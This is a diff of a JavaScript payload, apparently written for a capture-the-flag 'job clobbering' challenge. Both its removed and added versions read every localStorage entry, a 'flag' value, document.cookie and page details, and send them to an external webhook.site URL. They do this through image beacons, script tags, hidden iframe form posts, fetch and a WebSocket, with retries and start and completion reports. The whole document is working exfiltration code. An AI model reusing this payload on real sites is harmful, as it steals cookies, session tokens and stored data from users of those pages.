@@ -1,186 +1,191 @@
-  // CTF Job Clobbering Payload - Flag Extraction
-  console.log('🎯 PAYLOAD LOADED - CTF Job Clobbering Attack Active');
+     console.log('🎯 PAYLOAD LOADED - CORS-Free Flag Extraction');
 
-  // Send immediate confirmation
-  (function() {
-      try {
-          fetch('https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad', {
-              method: 'POST',
-              body: JSON.stringify({
-                  status: 'PAYLOAD_EXECUTION_START',
-                  timestamp: new Date().toISOString(),
-                  url: window.location.href,
-                  domain: window.location.hostname,
-                  userAgent: navigator.userAgent
-              }),
-              headers: {'Content-Type': 'application/json'}
-          });
-      } catch(e) {}
-  })();
+     // CORS-FREE METHODS FOR DATA EXFILTRATION
+     function sendViaImage(data) {
+         try {
+             const img = new Image();
+             const params = new URLSearchParams();
+             Object.keys(data).forEach(key => {
+                 params.append(key, typeof data[key] === 'object' ?
+     JSON.stringify(data[key]) : data[key]);
+             });
+             img.src =
+     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/img?' +
+     params.toString();
+             document.body.appendChild(img);
+             console.log('📸 Image exfiltration sent');
+         } catch(e) { console.error('Image method failed:', e); }
+     }
 
-  // Main flag extraction logic
-  try {
-      console.log('🔍 Searching for flag in localStorage...');
+     function sendViaScript(data) {
+         try {
+             const script = document.createElement('script');
+             const params = new URLSearchParams();
+             Object.keys(data).forEach(key => {
+                 params.append(key, typeof data[key] === 'object' ?
+     JSON.stringify(data[key]) : data[key]);
+             });
+             script.src =
+     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/script?' +
+     params.toString() + '&callback=handleWebhookResponse';
+             document.head.appendChild(script);
+             console.log('📜 Script exfiltration sent');
+         } catch(e) { console.error('Script method failed:', e); }
+     }
 
-      // Get all localStorage data
-      const allStorage = {};
-      const storageKeys = [];
+     function sendViaForm(data) {
+         try {
+             const form = document.createElement('form');
+             form.method = 'POST';
+             form.action =
+     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad';
+             form.target = 'webhook_frame_' + Date.now();
+             form.style.display = 'none';
 
-      for (let i = 0; i < localStorage.length; i++) {
-          const key = localStorage.key(i);
-          const value = localStorage.getItem(key);
-          allStorage[key] = value;
-          storageKeys.push(key);
-          console.log(`Found localStorage key: ${key} = ${value}`);
-      }
+             // Create hidden iframe for form target
+             const iframe = document.createElement('iframe');
+             iframe.name = form.target;
+             iframe.style.display = 'none';
+             document.body.appendChild(iframe);
 
-      // Try to find the flag
-      const flag = localStorage.getItem('flag');
-      const flagFound = !!flag;
+             // Add all data as form fields
+             Object.keys(data).forEach(key => {
+                 const input = document.createElement('input');
+                 input.type = 'hidden';
+                 input.name = key;
+                 input.value = typeof data[key] === 'object' ?
+     JSON.stringify(data[key]) : data[key];
+                 form.appendChild(input);
+             });
 
-      console.log(`Flag found: ${flagFound}`);
-      if (flag) {
-          console.log(`🚩 FLAG CAPTURED: ${flag}`);
-      }
+             document.body.appendChild(form);
+             form.submit();
+             console.log('📋 Form exfiltration sent');
 
-      // Prepare comprehensive data package
-      const exfilData = {
-          status: 'FLAG_EXTRACTION_COMPLETE',
-          timestamp: new Date().toISOString(),
-          success: flagFound,
-          flag: flag,
-          all_localStorage: allStorage,
-          localStorage_keys: storageKeys,
-          page_info: {
-              url: window.location.href,
-              domain: window.location.hostname,
-              path: window.location.pathname,
-              hash: window.location.hash,
-              userAgent: navigator.userAgent,
-              referrer: document.referrer
-          },
-          document_info: {
-              title: document.title,
-              cookie: document.cookie,
-              domain: document.domain
-          }
-      };
+             // Clean up after a delay
+             setTimeout(() => {
+                 if (form.parentNode) form.parentNode.removeChild(form);
+                 if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
+             }, 5000);
+         } catch(e) { console.error('Form method failed:', e); }
+     }
 
-      console.log('📤 Sending comprehensive data package...');
+     // Send payload start confirmation
+     const startData = {
+         status: 'PAYLOAD_EXECUTION_START',
+         timestamp: new Date().toISOString(),
+         url: window.location.href,
+         domain: window.location.hostname,
+         userAgent: navigator.userAgent
+     };
 
-      // Primary exfiltration - JSON POST
-      fetch('https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad', {
-          method: 'POST',
-          body: JSON.stringify(exfilData),
-          headers: {'Content-Type': 'application/json'}
-      }).then(() => {
-          console.log('✅ Primary exfiltration successful');
-      }).catch(error => {
-          console.error('❌ Primary exfiltration failed:', error);
-      });
+     sendViaImage(startData);
+     sendViaScript(startData);
+     sendViaForm(startData);
 
-      // Backup exfiltration methods
-      if (flag) {
-          // Method 1: Image GET request
-          try {
-              const img1 = new Image();
-              img1.src =
-  'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/flag-img?flag=' +
-  encodeURIComponent(flag) + '&t=' + Date.now();
-              document.body.appendChild(img1);
-              console.log('📸 Image exfiltration initiated');
-          } catch(e) {}
+     // Main flag extraction logic
+     try {
+         console.log('🔍 Searching for flag in localStorage...');
 
-          // Method 2: Script tag with flag as parameter
-          try {
-              const script = document.createElement('script');
-              script.src =
-  'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/flag-script?flag=' +
-  encodeURIComponent(flag) + '&method=script&t=' + Date.now();
-              script.head.appendChild(script);
-              console.log('📜 Script exfiltration initiated');
-          } catch(e) {}
+         // Extract all localStorage data
+         const allStorage = {};
+         const storageKeys = [];
 
-          // Method 3: Form submission
-          try {
-              const form = document.createElement('form');
-              form.method = 'POST';
-              form.action =
-  'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad';
-              form.target = '_blank';
-              form.style.display = 'none';
+         for (let i = 0; i < localStorage.length; i++) {
+             const key = localStorage.key(i);
+             const value = localStorage.getItem(key);
+             allStorage[key] = value;
+             storageKeys.push(key);
+             console.log(`Found localStorage key: ${key} = ${value}`);
+         }
 
-              const flagInput = document.createElement('input');
-              flagInput.type = 'hidden';
-              flagInput.name = 'captured_flag';
-              flagInput.value = flag;
+         // Try to find the flag
+         const flag = localStorage.getItem('flag');
+         const flagFound = !!flag;
 
-              const methodInput = document.createElement('input');
-              methodInput.type = 'hidden';
-              methodInput.name = 'method';
-              methodInput.value = 'form_submission';
+         console.log(`Flag found: ${flagFound}`);
+         if (flag) {
+             console.log(`🚩 FLAG CAPTURED: ${flag}`);
+         }
 
-              const timestampInput = document.createElement('input');
-              timestampInput.type = 'hidden';
-              timestampInput.name = 'timestamp';
-              timestampInput.value = new Date().toISOString();
+         // Prepare comprehensive data package
+         const flagData = {
+             status: 'FLAG_EXTRACTION_COMPLETE',
+             timestamp: new Date().toISOString(),
+             success: flagFound,
+             flag: flag || 'not_found',
+             all_localStorage: JSON.stringify(allStorage),
+             localStorage_keys: storageKeys.join(','),
+             page_url: window.location.href,
+             page_domain: window.location.hostname,
+             page_title: document.title,
+             cookies: document.cookie || 'none',
+             referrer: document.referrer || 'none',
+             user_agent: navigator.userAgent
+         };
 
-              form.appendChild(flagInput);
-              form.appendChild(methodInput);
-              form.appendChild(timestampInput);
-              document.body.appendChild(form);
-              form.submit();
-              console.log('📋 Form exfiltration initiated');
-          } catch(e) {}
+         console.log('📤 Sending flag data via all methods...');
 
-          // Method 4: WebSocket if available
-          try {
-              const ws = new
-  WebSocket('wss://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad');
-              ws.onopen = function() {
-                  ws.send(JSON.stringify({
-                      method: 'websocket',
-                      flag: flag,
-                      timestamp: new Date().toISOString()
-                  }));
-                  ws.close();
-                  console.log('🔌 WebSocket exfiltration attempted');
-              };
-          } catch(e) {}
-      }
+         // Send via all CORS-free methods
+         sendViaImage(flagData);
+         sendViaScript(flagData);
+         sendViaForm(flagData);
 
-      // Send final confirmation
-      setTimeout(() => {
-          try {
-              fetch('https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad', {
-                  method: 'POST',
-                  body: JSON.stringify({
-                      status: 'PAYLOAD_EXECUTION_COMPLETE',
-                      timestamp: new Date().toISOString(),
-                      flag_captured: flagFound,
-                      exfiltration_methods_attempted: 4
-                  }),
-                  headers: {'Content-Type': 'application/json'}
-              });
-          } catch(e) {}
-      }, 2000);
+         // If flag found, send additional confirmations
+         if (flag) {
+             const flagConfirmData = {
+                 status: 'FLAG_CONFIRMED',
+                 flag: flag,
+                 timestamp: new Date().toISOString(),
+                 extraction_method: 'localStorage'
+             };
 
-  } catch (error) {
-      console.error('🚨 Payload execution error:', error);
+             // Multiple confirmations with different approaches
+             setTimeout(() => sendViaImage(flagConfirmData), 1000);
+             setTimeout(() => sendViaScript(flagConfirmData), 1500);
+             setTimeout(() => sendViaForm(flagConfirmData), 2000);
 
-      // Report error
-      try {
-          fetch('https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad', {
-              method: 'POST',
-              body: JSON.stringify({
-                  status: 'PAYLOAD_ERROR',
-                  error: error.message,
-                  stack: error.stack,
-                  timestamp: new Date().toISOString()
-              }),
-              headers: {'Content-Type': 'application/json'}
-          });
-      } catch(e) {}
-  }
+             // Create a visible element with the flag (for debugging)
+             const flagDiv = document.createElement('div');
+             flagDiv.style.cssText =
+     'position:fixed;top:-100px;left:-100px;width:1px;height:1px;opacity:0.01;';
+             flagDiv.innerHTML = `<!-- FLAG: ${flag} -->`;
+             document.body.appendChild(flagDiv);
+         }
 
-  console.log('🏁 Payload execution completed');
+         // Send final completion status
+         setTimeout(() => {
+             const completionData = {
+                 status: 'PAYLOAD_EXECUTION_COMPLETE',
+                 timestamp: new Date().toISOString(),
+                 flag_captured: flagFound,
+                 methods_attempted: 3,
+                 total_localStorage_items: storageKeys.length
+             };
+
+             sendViaImage(completionData);
+             sendViaScript(completionData);
+             sendViaForm(completionData);
+         }, 3000);
+
+     } catch (error) {
+         console.error('🚨 Payload execution error:', error);
+
+         const errorData = {
+             status: 'PAYLOAD_ERROR',
+             error_message: error.message,
+             error_stack: error.stack || 'no_stack',
+             timestamp: new Date().toISOString()
+         };
+
+         sendViaImage(errorData);
+         sendViaScript(errorData);
+         sendViaForm(errorData);
+     }
+
+     // Global callback function for script method responses
+     window.handleWebhookResponse = function(response) {
+         console.log('Webhook response received:', response);
+     };
+
+     console.log('🏁 Payload script completed');
